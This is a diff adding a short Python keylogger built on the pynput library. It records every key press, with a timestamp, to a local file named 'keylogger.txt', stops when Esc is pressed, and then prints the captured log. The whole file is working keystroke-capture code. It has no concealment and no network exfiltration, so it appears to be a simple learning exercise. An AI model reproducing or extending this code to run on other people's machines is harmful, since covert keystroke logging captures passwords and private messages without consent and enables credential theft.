@@ -1,0 +1,21 @@
+from pynput import keyboard 
+from pynput.keyboard import Listener , Key
+from time import time, ctime
+f = open('keylogger.txt','a')
+
+def input(key):
+    log = []
+    log.append(key)
+    t = time()
+    f.writelines(ctime(t)+" : "+str(log)+"\n")
+
+def outside(key):
+    if key == Key.esc:
+        f.close() 
+        quit()
+
+with Listener(on_press=input , on_release=outside) as listener:
+    listener.join()
+f = open('keylogger.txt', 'r')
+print(f.read()) 
+f.close()
